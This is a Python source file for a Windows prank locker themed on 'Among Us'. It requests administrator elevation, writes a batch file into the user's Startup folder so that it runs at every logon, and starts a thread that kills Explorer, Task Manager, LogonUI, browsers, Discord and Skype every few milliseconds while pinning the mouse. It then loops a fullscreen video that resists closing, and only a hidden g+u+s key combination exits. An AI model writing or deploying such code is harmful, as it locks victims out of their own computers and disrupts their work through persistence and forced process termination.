# -*- coding: utf8 -*-
import ctypes
import sys
import os


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin() or os.path.exists("first.run"):
    import pyglet
    import sys
    from threading import Thread
    from subprocess import call
    import psutil
    import time
    import keyboard
    import mouse
    f = open("first.run", "a")
    f.write("Fuck you")
    f.close()

    import getpass
    USER_NAME = getpass.getuser()

    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "amogus.bat", "w+") as bat_file:
            bat_file.write(r'start /d "%s" amongus.exe' % file_path)
            print(bat_path)
            print(r'start /d "%s" amongus.exe' % file_path)

    def killer():

        while True:
            for proc in psutil.process_iter():
                # print(proc.name())
                name = proc.name().lower()
                if "explorer" in name or "taskmgr" in name or "logonui" in name or "discord" in name or "chrome" in name or "mozilla" in name or "skype" in name:
                    try:
                        proc.kill()
                    except:
                        pass
            mouse.move(0, 0)
            time.sleep(0.005)

    add_to_startup()
    killerThread = Thread(target=killer)
    killerThread.setDaemon(True)
    killerThread.start()
    # screens = display.get_screens()
    # print(screens)

    window = pyglet.window.Window(fullscreen=True)
    # window = pyglet.window.Window()
    window.set_exclusive_mouse()
    player = pyglet.media.Player()
    source = pyglet.media.StreamingSource()
    video = pyglet.media.load("amogus.mp4")

    player.queue(video)
    player.play()
    # player.loop = True

    # player.volume = 0.25
    # call(["amixer", "-D", "pulse", "sset", "Master", "100%"])

    @player.event
    def on_player_eos():
        print("EOS")
        video = pyglet.media.load("amogus.mp4")
        player.queue(video)
        player.play()

    @window.event
    def on_draw():
        if keyboard.is_pressed("g") and keyboard.is_pressed("u") and keyboard.is_pressed("s"):
            # killerThread._stop()
            exit()
        if player.source and player.source.video_format:
            player.texture.width = window.width
            player.texture.height = window.height
            player.get_texture().blit(0, 0)

    @window.event
    def on_close():
        pyglet.app.run()

    @window.event
    def on_deactivate():
        pyglet.app.run()

    @window.event
    def on_hide():
        pyglet.app.run()

    pyglet.app.run()
else:
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)
